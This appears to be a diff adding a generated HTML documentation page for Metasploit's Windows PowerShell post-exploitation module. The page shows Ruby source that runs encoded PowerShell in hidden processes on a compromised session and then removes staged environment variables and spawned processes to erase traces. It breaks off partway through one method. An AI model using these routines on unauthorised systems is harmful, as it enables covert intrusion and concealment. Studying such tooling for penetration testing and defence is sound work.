@@ -1,0 +1,1326 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>
+  Module: Msf::Post::Windows::Powershell
+  
+    &mdash; Documentation by YARD 0.9.26
+  
+</title>
+
+  <link rel="stylesheet" href="../../../css/style.css" type="text/css" />
+
+  <link rel="stylesheet" href="../../../css/common.css" type="text/css" />
+
+<script type="text/javascript">
+  pathId = "Msf::Post::Windows::Powershell";
+  relpath = '../../../';
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div class="nav_wrap">
+      <iframe id="nav" src="../../../class_list.html?1"></iframe>
+      <div id="resizer"></div>
+    </div>
+
+    <div id="main" tabindex="-1">
+      <div id="header">
+        <div id="menu">
+  
+    <a href="../../../_index.html">Index (P)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../Post.html" title="Msf::Post (class)">Post</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Windows.html" title="Msf::Post::Windows (module)">Windows</a></span></span>
+     &raquo; 
+    <span class="title">Powershell</span>
+  
+</div>
+
+        <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../../class_list.html">
+
+        <svg width="24" height="24">
+          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
+        </svg>
+    </a>
+  
+</div>
+        <div class="clear"></div>
+      </div>
+
+      <div id="content"><h1>Module: Msf::Post::Windows::Powershell
+  
+  
+  
+</h1>
+<div class="box_info">
+  
+
+  
+  
+  
+  
+  <dl>
+      <dt>Includes:</dt>
+      <dd><span class='object_link'><a href="../../Exploit/Powershell.html" title="Msf::Exploit::Powershell (module)">Exploit::Powershell</a></span>, <span class='object_link'><a href="../Common.html" title="Msf::Post::Common (module)">Common</a></span></dd>
+  </dl>
+  
+  
+
+  
+
+  
+  <dl>
+    <dt>Defined in:</dt>
+    <dd>lib/msf/core/post/windows/powershell.rb</dd>
+  </dl>
+  
+</div>
+
+<h2>Overview</h2><div class="docstring">
+  <div class="discussion">
+    
+<p>Powershell exploitation routines</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div>
+
+
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small><a href="#" class="summary_toggle">collapse</a></small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#clean_up-instance_method" title="#clean_up (instance method)">#<strong>clean_up</strong>(script_file = nil, eof = &#39;&#39;, running_pids = [], open_channels = [], env_suffix = Rex::Text.rand_text_alpha(8), delete = false)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Clean up powershell script including process and chunks stored in environment variables.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#execute_script-instance_method" title="#execute_script (instance method)">#<strong>execute_script</strong>(script, greedy_kill = false)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Execute a powershell script and return the output, channels, and pids.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_powershell_version-instance_method" title="#get_powershell_version (instance method)">#<strong>get_powershell_version</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns the Powershell version.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_ps_output-instance_method" title="#get_ps_output (instance method)">#<strong>get_ps_output</strong>(cmd_out, eof, read_wait = 5)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Reads output of the command channel and empties the buffer.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_ps_pids-instance_method" title="#get_ps_pids (instance method)">#<strong>get_ps_pids</strong>(pids = [])  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Get/compare list of current PS processes - nested execution can spawn many children doing checks before and after execution allows us to kill more children…</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#have_powershell%3F-instance_method" title="#have_powershell? (instance method)">#<strong>have_powershell?</strong>  &#x21d2; Boolean </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns true if powershell is installed.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#initialize-instance_method" title="#initialize (instance method)">#<strong>initialize</strong>(info = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#psh_exec-instance_method" title="#psh_exec (instance method)">#<strong>psh_exec</strong>(script, greedy_kill = true, ps_cleanup = true)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Simple script execution wrapper, performs all steps required to execute a string of powershell.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#stage_cmd_env-instance_method" title="#stage_cmd_env (instance method)">#<strong>stage_cmd_env</strong>(compressed_script, env_suffix = Rex::Text.rand_text_alpha(8))  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Powershell scripts that are longer than 8000 bytes are split into 8000 byte chunks and stored as CMD environment variables.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#stage_psh_env-instance_method" title="#stage_psh_env (instance method)">#<strong>stage_psh_env</strong>(script)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Uploads a script into a Powershell session via memory (Powershell session types only).</p>
+</div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="../Common.html" title="Msf::Post::Common (module)">Common</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../Common.html#clear_screen-instance_method" title="Msf::Post::Common#clear_screen (method)">#clear_screen</a></span>, <span class='object_link'><a href="../Common.html#cmd_exec-instance_method" title="Msf::Post::Common#cmd_exec (method)">#cmd_exec</a></span>, <span class='object_link'><a href="../Common.html#cmd_exec_get_pid-instance_method" title="Msf::Post::Common#cmd_exec_get_pid (method)">#cmd_exec_get_pid</a></span>, <span class='object_link'><a href="../Common.html#command_exists%3F-instance_method" title="Msf::Post::Common#command_exists? (method)">#command_exists?</a></span>, <span class='object_link'><a href="../Common.html#get_env-instance_method" title="Msf::Post::Common#get_env (method)">#get_env</a></span>, <span class='object_link'><a href="../Common.html#get_envs-instance_method" title="Msf::Post::Common#get_envs (method)">#get_envs</a></span>, <span class='object_link'><a href="../Common.html#has_pid%3F-instance_method" title="Msf::Post::Common#has_pid? (method)">#has_pid?</a></span>, <span class='object_link'><a href="../Common.html#peer-instance_method" title="Msf::Post::Common#peer (method)">#peer</a></span>, <span class='object_link'><a href="../Common.html#report_virtualization-instance_method" title="Msf::Post::Common#report_virtualization (method)">#report_virtualization</a></span>, <span class='object_link'><a href="../Common.html#rhost-instance_method" title="Msf::Post::Common#rhost (method)">#rhost</a></span>, <span class='object_link'><a href="../Common.html#rport-instance_method" title="Msf::Post::Common#rport (method)">#rport</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="../../Exploit/Powershell.html" title="Msf::Exploit::Powershell (module)">Exploit::Powershell</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../../Exploit/Powershell.html#bypass_powershell_protections-instance_method" title="Msf::Exploit::Powershell#bypass_powershell_protections (method)">#bypass_powershell_protections</a></span>, <span class='object_link'><a href="../../Exploit/Powershell.html#cmd_psh_payload-instance_method" title="Msf::Exploit::Powershell#cmd_psh_payload (method)">#cmd_psh_payload</a></span>, <span class='object_link'><a href="../../Exploit/Powershell.html#compress_script-instance_method" title="Msf::Exploit::Powershell#compress_script (method)">#compress_script</a></span>, <span class='object_link'><a href="../../Exploit/Powershell.html#decode_script-instance_method" title="Msf::Exploit::Powershell#decode_script (method)">#decode_script</a></span>, <span class='object_link'><a href="../../Exploit/Powershell.html#decompress_script-instance_method" title="Msf::Exploit::Powershell#decompress_script (method)">#decompress_script</a></span>, <span class='object_link'><a href="../../Exploit/Powershell.html#encode_script-instance_method" title="Msf::Exploit::Powershell#encode_script (method)">#encode_script</a></span>, <span class='object_link'><a href="../../Exploit/Powershell.html#generate_psh_args-instance_method" title="Msf::Exploit::Powershell#generate_psh_args (method)">#generate_psh_args</a></span>, <span class='object_link'><a href="../../Exploit/Powershell.html#generate_psh_command_line-instance_method" title="Msf::Exploit::Powershell#generate_psh_command_line (method)">#generate_psh_command_line</a></span>, <span class='object_link'><a href="../../Exploit/Powershell.html#make_subs-instance_method" title="Msf::Exploit::Powershell#make_subs (method)">#make_subs</a></span>, <span class='object_link'><a href="../../Exploit/Powershell.html#process_subs-instance_method" title="Msf::Exploit::Powershell#process_subs (method)">#process_subs</a></span>, <span class='object_link'><a href="../../Exploit/Powershell.html#read_script-instance_method" title="Msf::Exploit::Powershell#read_script (method)">#read_script</a></span>, <span class='object_link'><a href="../../Exploit/Powershell.html#run_hidden_psh-instance_method" title="Msf::Exploit::Powershell#run_hidden_psh (method)">#run_hidden_psh</a></span></p>
+
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="clean_up-instance_method">
+  
+    #<strong>clean_up</strong>(script_file = nil, eof = &#39;&#39;, running_pids = [], open_channels = [], env_suffix = Rex::Text.rand_text_alpha(8), delete = false)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Clean up powershell script including process and chunks stored in environment variables</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+263
+264
+265
+266
+267
+268
+269
+270
+271
+272
+273
+274
+275
+276
+277
+278
+279
+280
+281
+282
+283
+284
+285
+286
+287
+288
+289
+290
+291
+292
+293</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/powershell.rb', line 263</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_clean_up'>clean_up</span><span class='lparen'>(</span><span class='id identifier rubyid_script_file'>script_file</span> <span class='op'>=</span> <span class='kw'>nil</span><span class='comma'>,</span> <span class='id identifier rubyid_eof'>eof</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_running_pids'>running_pids</span> <span class='op'>=</span> <span class='lbracket'>[</span><span class='rbracket'>]</span><span class='comma'>,</span> <span class='id identifier rubyid_open_channels'>open_channels</span> <span class='op'>=</span> <span class='lbracket'>[</span><span class='rbracket'>]</span><span class='comma'>,</span>
+             <span class='id identifier rubyid_env_suffix'>env_suffix</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha'>rand_text_alpha</span><span class='lparen'>(</span><span class='int'>8</span><span class='rparen'>)</span><span class='comma'>,</span> <span class='id identifier rubyid_delete'>delete</span> <span class='op'>=</span> <span class='kw'>false</span><span class='rparen'>)</span>
+  <span class='comment'># Remove environment variables
+</span>  <span class='id identifier rubyid_env_del_command'>env_del_command</span> <span class='op'>=</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>[Environment]::GetEnvironmentVariables(&#39;User&#39;).keys|</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_env_del_command'>env_del_command</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Select-String </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_env_suffix'>env_suffix</span><span class='embexpr_end'>}</span><span class='tstring_content'>|%{</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_env_del_command'>env_del_command</span> <span class='op'>+=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>[Environment]::SetEnvironmentVariable($_,$null,&#39;User&#39;)}</span><span class='tstring_end'>&quot;</span></span>
+
+  <span class='id identifier rubyid_script'>script</span> <span class='op'>=</span> <span class='id identifier rubyid_compress_script'>compress_script</span><span class='lparen'>(</span><span class='id identifier rubyid_env_del_command'>env_del_command</span><span class='comma'>,</span> <span class='id identifier rubyid_eof'>eof</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_cmd_out'>cmd_out</span><span class='comma'>,</span> <span class='id identifier rubyid_new_running_pids'>new_running_pids</span><span class='comma'>,</span> <span class='id identifier rubyid_new_open_channels'>new_open_channels</span> <span class='op'>=</span> <span class='id identifier rubyid_execute_script'>execute_script</span><span class='lparen'>(</span><span class='id identifier rubyid_script'>script</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_get_ps_output'>get_ps_output</span><span class='lparen'>(</span><span class='id identifier rubyid_cmd_out'>cmd_out</span><span class='comma'>,</span> <span class='id identifier rubyid_eof'>eof</span><span class='rparen'>)</span>
+
+  <span class='comment'># Kill running processes, should mutex this...
+</span>  <span class='ivar'>@session_pids</span> <span class='op'>=</span> <span class='lparen'>(</span><span class='ivar'>@session_pids</span> <span class='op'>+</span> <span class='id identifier rubyid_running_pids'>running_pids</span> <span class='op'>+</span> <span class='id identifier rubyid_new_running_pids'>new_running_pids</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_uniq'>uniq</span>
+  <span class='lparen'>(</span><span class='id identifier rubyid_running_pids'>running_pids</span> <span class='op'>+</span> <span class='id identifier rubyid_new_running_pids'>new_running_pids</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_uniq'>uniq</span><span class='period'>.</span><span class='id identifier rubyid_each'>each</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_pid'>pid</span><span class='op'>|</span>
+    <span class='kw'>begin</span>
+      <span class='kw'>if</span> <span class='id identifier rubyid_session'>session</span><span class='period'>.</span><span class='id identifier rubyid_sys'>sys</span><span class='period'>.</span><span class='id identifier rubyid_process'>process</span><span class='period'>.</span><span class='id identifier rubyid_processes'>processes</span><span class='period'>.</span><span class='id identifier rubyid_map'>map</span> <span class='lbrace'>{</span> <span class='op'>|</span><span class='id identifier rubyid_x'>x</span><span class='op'>|</span> <span class='id identifier rubyid_x'>x</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>pid</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='rbrace'>}</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span><span class='lparen'>(</span><span class='id identifier rubyid_pid'>pid</span><span class='rparen'>)</span>
+        <span class='id identifier rubyid_session'>session</span><span class='period'>.</span><span class='id identifier rubyid_sys'>sys</span><span class='period'>.</span><span class='id identifier rubyid_process'>process</span><span class='period'>.</span><span class='id identifier rubyid_kill'>kill</span><span class='lparen'>(</span><span class='id identifier rubyid_pid'>pid</span><span class='rparen'>)</span>
+      <span class='kw'>end</span>
+      <span class='ivar'>@session_pids</span><span class='period'>.</span><span class='id identifier rubyid_delete'>delete</span><span class='lparen'>(</span><span class='id identifier rubyid_pid'>pid</span><span class='rparen'>)</span>
+    <span class='kw'>rescue</span> <span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Rex/Post.html" title="Rex::Post (module)">Post</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Rex/Post/Meterpreter.html" title="Rex::Post::Meterpreter (module)">Meterpreter</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Rex/Post/Meterpreter/RequestError.html" title="Rex::Post::Meterpreter::RequestError (class)">RequestError</a></span></span> <span class='op'>=&gt;</span> <span class='id identifier rubyid_e'>e</span>
+      <span class='id identifier rubyid_print_error'><span class='object_link'><a href="../../../top-level-namespace.html#print_error-instance_method" title="#print_error (method)">print_error</a></span></span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Failed to kill </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_pid'>pid</span><span class='embexpr_end'>}</span><span class='tstring_content'> due to </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_e'>e</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+    <span class='kw'>end</span>
+  <span class='kw'>end</span>
+
+  <span class='comment'># Close open channels
+</span>  <span class='lparen'>(</span><span class='id identifier rubyid_open_channels'>open_channels</span> <span class='op'>+</span> <span class='id identifier rubyid_new_open_channels'>new_open_channels</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_uniq'>uniq</span><span class='period'>.</span><span class='id identifier rubyid_each'>each</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_chan'>chan</span><span class='op'>|</span>
+    <span class='id identifier rubyid_chan'>chan</span><span class='period'>.</span><span class='id identifier rubyid_channel'>channel</span><span class='period'>.</span><span class='id identifier rubyid_close'>close</span>
+  <span class='kw'>end</span>
+
+  <span class='op'>::</span><span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_delete'>delete</span><span class='lparen'>(</span><span class='id identifier rubyid_script_file'>script_file</span><span class='rparen'>)</span> <span class='kw'>if</span> <span class='id identifier rubyid_script_file'>script_file</span> <span class='op'>&amp;&amp;</span> <span class='id identifier rubyid_delete'>delete</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="execute_script-instance_method">
+  
+    #<strong>execute_script</strong>(script, greedy_kill = false)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Execute a powershell script and return the output, channels, and pids. The script is never written to disk.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/powershell.rb', line 74</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_execute_script'>execute_script</span><span class='lparen'>(</span><span class='id identifier rubyid_script'>script</span><span class='comma'>,</span> <span class='id identifier rubyid_greedy_kill'>greedy_kill</span> <span class='op'>=</span> <span class='kw'>false</span><span class='rparen'>)</span>
+  <span class='ivar'>@session_pids</span> <span class='op'>||=</span> <span class='lbracket'>[</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_running_pids'>running_pids</span> <span class='op'>=</span> <span class='id identifier rubyid_greedy_kill'>greedy_kill</span> <span class='op'>?</span> <span class='id identifier rubyid_get_ps_pids'>get_ps_pids</span> <span class='op'>:</span> <span class='lbracket'>[</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_open_channels'>open_channels</span> <span class='op'>=</span> <span class='lbracket'>[</span><span class='rbracket'>]</span>
+  <span class='comment'># Execute using -EncodedCommand
+</span>  <span class='id identifier rubyid_session'>session</span><span class='period'>.</span><span class='id identifier rubyid_response_timeout'>response_timeout</span> <span class='op'>=</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell::Post::timeout</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_i'>to_i</span>
+  <span class='id identifier rubyid_ps_bin'>ps_bin</span> <span class='op'>=</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell::Post::force_wow64</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>?</span>
+    <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>%windir%\syswow64\WindowsPowerShell\v1.0\powershell.exe</span><span class='tstring_end'>&#39;</span></span> <span class='op'>:</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>powershell.exe</span><span class='tstring_end'>&#39;</span></span>
+
+  <span class='comment'># Check to ensure base64 encoding - regex format and content length division
+</span>  <span class='kw'>unless</span> <span class='id identifier rubyid_script'>script</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='period'>.</span><span class='id identifier rubyid_match'>match</span><span class='lparen'>(</span><span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>[A-Za-z0-9+\/]+={0,3}</span><span class='regexp_end'>/</span></span><span class='rparen'>)</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span> <span class='op'>==</span> <span class='id identifier rubyid_script'>script</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>&amp;&amp;</span> <span class='lparen'>(</span><span class='id identifier rubyid_script'>script</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>%</span> <span class='int'>4</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_zero?'>zero?</span>
+    <span class='id identifier rubyid_script'>script</span> <span class='op'>=</span> <span class='id identifier rubyid_encode_script'>encode_script</span><span class='lparen'>(</span><span class='id identifier rubyid_script'>script</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_ps_string'>ps_string</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>-EncodedCommand </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_script'>script</span><span class='embexpr_end'>}</span><span class='tstring_content'> -InputFormat None</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_vprint_good'>vprint_good</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>EXECUTING:\n</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_ps_bin'>ps_bin</span><span class='embexpr_end'>}</span><span class='tstring_content'> </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_ps_string'>ps_string</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_cmd_out'>cmd_out</span> <span class='op'>=</span> <span class='id identifier rubyid_session'>session</span><span class='period'>.</span><span class='id identifier rubyid_sys'>sys</span><span class='period'>.</span><span class='id identifier rubyid_process'>process</span><span class='period'>.</span><span class='id identifier rubyid_execute'>execute</span><span class='lparen'>(</span><span class='id identifier rubyid_ps_bin'>ps_bin</span><span class='comma'>,</span> <span class='id identifier rubyid_ps_string'>ps_string</span><span class='comma'>,</span> <span class='lbrace'>{</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Hidden</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span> <span class='kw'>true</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Channelized</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span> <span class='kw'>true</span> <span class='rbrace'>}</span><span class='rparen'>)</span>
+
+  <span class='comment'># Subtract prior PIDs from current
+</span>  <span class='kw'>if</span> <span class='id identifier rubyid_greedy_kill'>greedy_kill</span>
+    <span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>ThreadSafe</span><span class='period'>.</span><span class='id identifier rubyid_sleep'>sleep</span><span class='lparen'>(</span><span class='int'>3</span><span class='rparen'>)</span> <span class='comment'># Let PS start child procs
+</span>    <span class='id identifier rubyid_running_pids'>running_pids</span> <span class='op'>=</span> <span class='id identifier rubyid_get_ps_pids'>get_ps_pids</span><span class='lparen'>(</span><span class='id identifier rubyid_running_pids'>running_pids</span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+
+  <span class='comment'># Add to list of running processes
+</span>  <span class='id identifier rubyid_running_pids'>running_pids</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_cmd_out'>cmd_out</span><span class='period'>.</span><span class='id identifier rubyid_pid'>pid</span>
+
+  <span class='comment'># All pids start here, so store them in a class variable
+</span>  <span class='lparen'>(</span><span class='ivar'>@session_pids</span> <span class='op'>+=</span> <span class='id identifier rubyid_running_pids'>running_pids</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_uniq!'>uniq!</span>
+
+  <span class='comment'># Add to list of open channels
+</span>  <span class='id identifier rubyid_open_channels'>open_channels</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_cmd_out'>cmd_out</span>
+
+  <span class='lbracket'>[</span><span class='id identifier rubyid_cmd_out'>cmd_out</span><span class='comma'>,</span> <span class='id identifier rubyid_running_pids'>running_pids</span><span class='period'>.</span><span class='id identifier rubyid_uniq'>uniq</span><span class='comma'>,</span> <span class='id identifier rubyid_open_channels'>open_channels</span><span class='rbracket'>]</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_powershell_version-instance_method">
+  
+    #<strong>get_powershell_version</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns the Powershell version</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/powershell.rb', line 35</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_powershell_version'>get_powershell_version</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>unless</span> <span class='id identifier rubyid_have_powershell?'>have_powershell?</span>
+
+  <span class='id identifier rubyid_process'>process</span><span class='comma'>,</span> <span class='id identifier rubyid__pid'>_pid</span><span class='comma'>,</span> <span class='id identifier rubyid__c'>_c</span> <span class='op'>=</span> <span class='id identifier rubyid_execute_script'>execute_script</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>$PSVersionTable.PSVersion</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_o'>o</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+
+  <span class='kw'>while</span> <span class='lparen'>(</span><span class='id identifier rubyid_d'>d</span> <span class='op'>=</span> <span class='id identifier rubyid_process'>process</span><span class='period'>.</span><span class='id identifier rubyid_channel'>channel</span><span class='period'>.</span><span class='id identifier rubyid_read'>read</span><span class='rparen'>)</span>
+    <span class='kw'>if</span> <span class='id identifier rubyid_d'>d</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_end'>&quot;</span></span>
+      <span class='kw'>if</span> <span class='lparen'>(</span><span class='const'>Time</span><span class='period'>.</span><span class='id identifier rubyid_now'>now</span><span class='period'>.</span><span class='id identifier rubyid_to_i'>to_i</span> <span class='op'>-</span> <span class='id identifier rubyid_start'>start</span> <span class='op'>&lt;</span> <span class='id identifier rubyid_time_out'>time_out</span><span class='rparen'>)</span> <span class='op'>&amp;&amp;</span> <span class='lparen'>(</span><span class='id identifier rubyid_o'>o</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+        <span class='id identifier rubyid_sleep'>sleep</span> <span class='float'>0.1</span>
+      <span class='kw'>else</span>
+        <span class='kw'>break</span>
+      <span class='kw'>end</span>
+    <span class='kw'>else</span>
+      <span class='id identifier rubyid_o'>o</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_d'>d</span>
